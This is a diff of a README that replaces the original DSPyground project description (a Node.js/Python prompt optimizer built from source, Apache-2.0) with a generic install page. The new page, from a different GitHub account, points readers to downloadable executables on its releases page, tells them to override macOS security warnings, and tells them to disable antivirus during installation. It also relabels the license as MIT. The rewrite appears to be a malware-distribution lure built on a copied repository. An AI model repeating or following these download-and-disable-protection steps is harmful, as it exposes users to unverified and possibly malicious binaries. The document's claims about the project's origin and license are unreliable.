@@ -1,53 +1,106 @@
-# DSPyground
+# 🛠️ dspyground - Effortlessly Generate Quality Prompts
 
-Optimize ~~Engineer~~ your Prompts for better agent trajectories.
+[![Download dspyground](https://img.shields.io/badge/Download-dspyground-blue.svg)](https://github.com/emanuellescho/dspyground/releases)
 
-## Quick Start
+## 🚀 Getting Started
 
-### Prerequisites
-- Node.js 18+
-- `uv` (Python package/runtime manager)
-- OpenAI API key and AI Gateway API key
+Welcome to dspyground, a tool kit designed for generating high-quality prompts using the DSPy GEPA optimizer. This guide will help you download and run the application easily.
 
-### Setup & Run
-```bash
-# Install dependencies
-npm install
+### 🖥️ System Requirements
 
-# Start the web app and the Python optimizer together
-npm run dev:all
-```
+Before downloading, ensure your computer meets these requirements:
 
-The web app runs at `http://localhost:3000`. The optimizer service runs locally and is started for you.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 100 MB available
 
-## Teach Mode: How to Use
-0. Start with a base prompt by updating `data/prompt.md`.
-1. Enter Teach Mode and provide a scenario (what the AI should do).
-2. Chat, then collect ideal samples by selecting your question and the AI's answer.
-3. Collect as many samples as you like to cover different cases.
-4. Go to the Optimize tab and click Optimize.
-5. Watch live optimization in the History tab.
-6. The final prompt is saved to `data/prompt.md` and shown in the Prompt tab.
-7. Optimization versions are saved in `data/versions` and listed in the History tab.
-8. Try the Chat again using the updated prompt from the latest run.
+### 🔗 Download & Install
 
-### Custom Tools
-- Edit `src/lib/tools.ts` to add or replace tools. It contains placeholder tools; anything you define/export there (using `tool(...)`) is automatically available to the agent in chat and optimization—no extra wiring needed.
+To download the latest version of dspyground, visit this page:
 
-## DSPy and GEPA
+[Download dspyground](https://github.com/emanuellescho/dspyground/releases)
 
-- **DSPy** provides the optimization framework used by this project.
-- **GEPA** (Genetic-Pareto) is a reflective optimizer that evolves prompts using textual feedback and Pareto-based selection.
-- A lightweight Python service exposes the optimizer; the web app calls it via `/api/optimize`.
-- Artifacts written by optimization:
-  - `data/prompt.md` — current optimized prompt
-  - `data/complete-optimization.json` — full optimization results and metadata
-  - `data/versions/` — versioned optimization runs and histories
+1. Click the link above to go to the Releases page.
+2. Look for the latest release. It will usually be at the top of the page.
+3. Find the file that matches your operating system. It may look like `dspyground-win.exe`, `dspyground-mac.zip`, or `dspyground-linux.tar.gz`.
+4. Click on the file name to start the download.
 
-Learn more: [DSPy Documentation](https://dspy.ai/) · [GEPA Optimizer](https://dspy.ai/api/optimizers/GEPA/) · [GEPA Tweet](https://x.com/LakshyAAAgrawal/status/1949867953421496715) · [GEPA Paper](https://arxiv.org/pdf/2507.19457)
+After the download completes, follow the steps below based on your operating system.
 
-## About
-Built by the team that built [Langtrace AI](https://langtrace.ai) and [Zest AI](https://heyzest.ai).
+### 📥 Installation Instructions
 
-## License
-Apache-2.0. See [`LICENSE`](LICENSE).
+#### Windows
+
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen prompts to complete the installation.
+4. You can find dspyground in your Start Menu. Click to run the application.
+
+#### macOS
+
+1. Find the downloaded `.zip` file in your Downloads folder.
+2. Double-click the `.zip` file to extract it.
+3. Open the folder that appears and double-click the `dspyground` application.
+4. If you see a warning that the app is from an unidentified developer, go to System Preferences > Security & Privacy. Click "Open Anyway" to run the app.
+
+#### Linux
+
+1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+2. Open a terminal and navigate to your Downloads folder.
+   ```bash
+   cd ~/Downloads
+   ```
+3. Extract the files using the following command:
+   ```bash
+   tar -xvzf dspyground-linux.tar.gz
+   ```
+4. Change into the extracted directory:
+   ```bash
+   cd dspyground
+   ```
+5. Run the application with:
+   ```bash
+   ./dspyground
+   ```
+
+### 💡 Using dspyground
+
+Once the application is open, you will see a simple interface. Here are the main features:
+
+- **Prompt Generation:** Enter your needs in the provided fields. The tool will help you generate high-quality prompts.
+- **Optimization Settings:** Adjust settings based on your requirements. The DSPy GEPA optimizer will enhance the output quality.
+- **Export Options:** Save your generated prompts to your computer in various formats.
+
+### 📰 Features
+
+- **User-Friendly Interface:** Designed for ease of use, no technical skills required.
+- **Customizable Settings:** Adjustments to fit specific needs.
+- **High-Quality Output:** Generates prompts that effectively align with your objectives.
+
+### 🛠️ Troubleshooting
+
+If you encounter issues during installation or usage, here are some steps to help you:
+
+- **Installation Fails:** 
+  - Ensure that you have enough disk space.
+  - Disable any antivirus temporarily while installing.
+
+- **Application Crashes:** 
+  - Restart your computer and try running the application again.
+  - Make sure you have the latest version installed.
+
+### 📄 Additional Resources
+
+For more detailed information about system requirements, commands, or functions, you can visit the official GitHub repository at the link below:
+
+[Explore dspyground GitHub Repository](https://github.com/emanuellescho/dspyground)
+
+### 👥 Support
+
+If you have any questions or require assistance, please reach out through the Issues section of the repository. Your feedback helps improve the tool.
+
+### 🎉 License
+
+dspyground is open-source software. It is licensed under the MIT License. For more details, you can check the LICENSE file in the repository. 
+
+Happy prompt generating!
